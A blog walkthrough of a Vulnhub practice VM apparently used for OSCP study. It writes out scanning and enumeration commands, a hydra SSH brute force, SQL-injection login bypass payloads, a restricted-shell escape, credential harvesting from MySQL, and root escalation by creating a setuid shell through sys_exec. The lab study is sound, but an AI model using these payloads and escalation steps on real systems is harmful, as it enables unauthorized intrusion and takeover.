---
published: true
---

Vulnhub virtual machine; On the path to OSCP this box offered enumeration of services with enum4linux and credential extraction via SQL-i. The main escalation occurs from within MySQL through manipulating the sys_exec function. This was a well rounded crafted box.


----------

Legal Usage:
*The information provided by executeatwill is to be used for educational purposes only. The website creator and/or editor is in no way responsible for any misuse of the information provided. All the information on this website is meant to help the reader develop penetration testing and vulnerability aptitude to prevent attacks discussed. In no way should you use the information to cause any kind of damage directly or indirectly. Information provided by this website is to be regarded from an “*[*ethical hacker*](https://www.dictionary.com/browse/ethical-hacker)*” standpoint. Only preform testing on systems you OWN and/or have expressed written permission. Use information at your own risk.*

*By continued reading, you acknowledge the aforementioned user risk/responsibilities.*


----------

Locate VM on network

    netdiscover -r 192.168.56.0/24

![](https://d2mxuefqeaa7sj.cloudfront.net/s_73CD622E440C59B912073B9EC90B94FA2B5668CB07E5E600D2AAF978D7A3E461_1550784203739_image.png)


# Enumeration
Nmap Scan

    nmap -sV -sC -oA nmap/kio4 192.168.56.106

![](https://d2mxuefqeaa7sj.cloudfront.net/s_73CD622E440C59B912073B9EC90B94FA2B5668CB07E5E600D2AAF978D7A3E461_1550785864594_image.png)


*Interesting of note, standard SSH port open, Apache web-server on HTTP with PHP/5.2.4, Samba on Netbios leaking a workgroup: WORKGROUP and script results yielding potential doorways into the network.*

Searchsploit
Performing a quick search of vulnerabilies based off information from nmap

    searchsploit php 5.2.4

![](https://d2mxuefqeaa7sj.cloudfront.net/s_73CD622E440C59B912073B9EC90B94FA2B5668CB07E5E600D2AAF978D7A3E461_1550786137515_image.png)


*Nothing quite useable.*


    searchsploit samba 3.x

![](https://d2mxuefqeaa7sj.cloudfront.net/s_73CD622E440C59B912073B9EC90B94FA2B5668CB07E5E600D2AAF978D7A3E461_1550786279406_image.png)


*few interesting finds for samba*


Investigate the HTTP server
navigate to 192.168.56.106

![](https://d2mxuefqeaa7sj.cloudfront.net/s_73CD622E440C59B912073B9EC90B94FA2B5668CB07E5E600D2AAF978D7A3E461_1550786374890_image.png)


*Interesting login page*

checking source:

![](https://d2mxuefqeaa7sj.cloudfront.net/s_73CD622E440C59B912073B9EC90B94FA2B5668CB07E5E600D2AAF978D7A3E461_1550786427477_image.png)


*Discovered application is using a ‘checklogin.php’ page to validate credentials.*

Perform SQL-injection
entered username: `admin' OR '1=1--`

![](https://d2mxuefqeaa7sj.cloudfront.net/s_73CD622E440C59B912073B9EC90B94FA2B5668CB07E5E600D2AAF978D7A3E461_1550786576189_image.png)


*Returned wrong username… there might be content filtering occurring.*


Perform enumeration of samba with enum4linux

    enum4linux 192.168.56.106

![](https://d2mxuefqeaa7sj.cloudfront.net/s_73CD622E440C59B912073B9EC90B94FA2B5668CB07E5E600D2AAF978D7A3E461_1550786818835_image.png)

![](https://d2mxuefqeaa7sj.cloudfront.net/s_73CD622E440C59B912073B9EC90B94FA2B5668CB07E5E600D2AAF978D7A3E461_1550786867205_image.png)


*Samba version has no public vulnerabilities but we did discover users*

Users: `nobody`,`robert`,`root`,`john`, and `loneferret`

Brute-Force SSH (hydra)
added list of users to a file name ‘users’

    hydra -L users -P /usr/share/wordlists/rockyou.txt -t 4 192.168.56.106 ssh -vv

![](https://d2mxuefqeaa7sj.cloudfront.net/s_73CD622E440C59B912073B9EC90B94FA2B5668CB07E5E600D2AAF978D7A3E461_1550787629004_image.png)


*Hydra was not able to break into the front door. Time head back to the HTTP server.*

Noticing that during the web-login it prompted that I was not the correct user with my SQL injection. Lets try to repeat with usernames discovered.

SQL-injection Part deux
Username: `john`
Password: `' or 1=1 --`

![](https://d2mxuefqeaa7sj.cloudfront.net/s_73CD622E440C59B912073B9EC90B94FA2B5668CB07E5E600D2AAF978D7A3E461_1550787827775_image.png)

![](https://d2mxuefqeaa7sj.cloudfront.net/s_73CD622E440C59B912073B9EC90B94FA2B5668CB07E5E600D2AAF978D7A3E461_1550787868356_image.png)


*Well that an improvement - logout button*

Username: `robert`
Password: `' or 1=1 --`

![](https://d2mxuefqeaa7sj.cloudfront.net/s_73CD622E440C59B912073B9EC90B94FA2B5668CB07E5E600D2AAF978D7A3E461_1550788093350_image.png)

![](https://d2mxuefqeaa7sj.cloudfront.net/s_73CD622E440C59B912073B9EC90B94FA2B5668CB07E5E600D2AAF978D7A3E461_1550788105287_image.png)


*Bingo-bango! we have a username and password*

| Username | robert                |
| -------- | --------------------- |
| Password | ADGAdsafdfwt4gadfga== |

*quickly to the SSH.*

# Remote Access/SSH

    ssh robert@192.168.56.106

![](https://d2mxuefqeaa7sj.cloudfront.net/s_73CD622E440C59B912073B9EC90B94FA2B5668CB07E5E600D2AAF978D7A3E461_1550788352355_image.png)


Let the enumeration begin

    sudo -l

![](https://d2mxuefqeaa7sj.cloudfront.net/s_73CD622E440C59B912073B9EC90B94FA2B5668CB07E5E600D2AAF978D7A3E461_1550788390459_image.png)

    uname -a

![](https://d2mxuefqeaa7sj.cloudfront.net/s_73CD622E440C59B912073B9EC90B94FA2B5668CB07E5E600D2AAF978D7A3E461_1550788415595_image.png)

    which python

![](https://d2mxuefqeaa7sj.cloudfront.net/s_73CD622E440C59B912073B9EC90B94FA2B5668CB07E5E600D2AAF978D7A3E461_1550788460435_image.png)

    cd /

![](https://d2mxuefqeaa7sj.cloudfront.net/s_73CD622E440C59B912073B9EC90B94FA2B5668CB07E5E600D2AAF978D7A3E461_1550788497865_image.png)


*well that escalated quickly…*

Escaping the restricted shell

    echo os.system("/bin/bash")

![](https://d2mxuefqeaa7sj.cloudfront.net/s_73CD622E440C59B912073B9EC90B94FA2B5668CB07E5E600D2AAF978D7A3E461_1550788604365_image.png)

![](https://d2mxuefqeaa7sj.cloudfront.net/s_73CD622E440C59B912073B9EC90B94FA2B5668CB07E5E600D2AAF978D7A3E461_1550788673208_image.png)


*Escaped!*

Lets see whats on this web-server

![](https://d2mxuefqeaa7sj.cloudfront.net/s_73CD622E440C59B912073B9EC90B94FA2B5668CB07E5E600D2AAF978D7A3E461_1550788771344_image.png)


You know what I want

    cat checklogin.php

![](https://d2mxuefqeaa7sj.cloudfront.net/s_73CD622E440C59B912073B9EC90B94FA2B5668CB07E5E600D2AAF978D7A3E461_1550788811132_image.png)


*We discovered MySql database usernames and passwords. No impressed by this administrator and choices for passwords.*

MySQL server enumeration

    mysql -u root -p

![](https://d2mxuefqeaa7sj.cloudfront.net/s_73CD622E440C59B912073B9EC90B94FA2B5668CB07E5E600D2AAF978D7A3E461_1550788935559_image.png)


Investigating

    SHOW DATABASES

![](https://d2mxuefqeaa7sj.cloudfront.net/s_73CD622E440C59B912073B9EC90B94FA2B5668CB07E5E600D2AAF978D7A3E461_1550788987189_image.png)

    use members;
    select * from members;

![](https://d2mxuefqeaa7sj.cloudfront.net/s_73CD622E440C59B912073B9EC90B94FA2B5668CB07E5E600D2AAF978D7A3E461_1550789094899_image.png)


*Acquired another password for john.*

|  1 | john       | MyNameIsJohn          
|  2 | robert   | ADGAdsafdfwt4gadfga== 

MySQL running as root

![](https://d2mxuefqeaa7sj.cloudfront.net/s_73CD622E440C59B912073B9EC90B94FA2B5668CB07E5E600D2AAF978D7A3E461_1550789304054_image.png)


*just the avenue we can use to Priv-Esc*

# Priv-Esc
Using mysql to give us a nice entryway to root


    mysql> use mysql;
    show tables;

![](https://d2mxuefqeaa7sj.cloudfront.net/s_73CD622E440C59B912073B9EC90B94FA2B5668CB07E5E600D2AAF978D7A3E461_1550789817523_image.png)

    select * from func;

![](https://d2mxuefqeaa7sj.cloudfront.net/s_73CD622E440C59B912073B9EC90B94FA2B5668CB07E5E600D2AAF978D7A3E461_1550789853234_image.png)


# Root

    select sys_exec('cp /bin/sh /tmp/shell; chown root /tmp/shell; chgrp root /tmp/shell; chmod u+s /tmp/shell');
    
    mysql> \! /tmp shell

![](https://d2mxuefqeaa7sj.cloudfront.net/s_73CD622E440C59B912073B9EC90B94FA2B5668CB07E5E600D2AAF978D7A3E461_1550789901373_image.png)


Bring me the root!

-exec

**Further Reading/Sources:**
 MySQL Root to System Root with lib_mysqludf_sys for Windows and Linux - [link](https://www.adampalmer.me/iodigitalsec/2013/08/13/mysql-root-to-system-root-with-udf-for-windows-and-linux/)
